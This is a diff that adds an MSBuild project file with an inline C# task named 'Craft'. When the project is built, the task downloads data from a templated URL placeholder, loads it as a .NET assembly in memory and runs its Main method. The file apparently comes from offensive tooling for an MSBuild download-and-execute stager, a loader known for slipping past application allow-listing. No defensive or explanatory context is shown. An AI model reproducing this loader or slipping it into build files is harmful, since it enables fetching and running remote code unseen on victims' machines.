@@ -1,0 +1,37 @@
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
+  <ItemGroup>
+      <Reference Include="System" />
+      <Reference Include="System.Reflection" />
+    </ItemGroup>
+  <Target Name="Build">
+    <Craft />
+  </Target>
+  <UsingTask TaskName="Craft" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Using Namespace="System"/>                                                                                                                                                                                                            
+      <Using Namespace="System.Reflection"/>  
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+            using Microsoft.Build.Framework;
+            using Microsoft.Build.Utilities;
+            using System;
+            using System.Reflection;
+
+            public class Craft : Task
+            {
+                public override bool Execute()
+                {
+                    System.Net.WebClient client = new System.Net.WebClient();
+                    byte[] data = client.DownloadData("{{URL}}");
+                    Assembly asm = Assembly.Load(data);
+                    Type program = asm.GetType("Craft.Program");
+                    MethodInfo main = program.GetMethod("Main", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
+                    main.Invoke(null, null);
+                    return true;
+                }
+            }
+        ]]>
+	    </Code>
+    </Task>
+  </UsingTask>
+</Project>
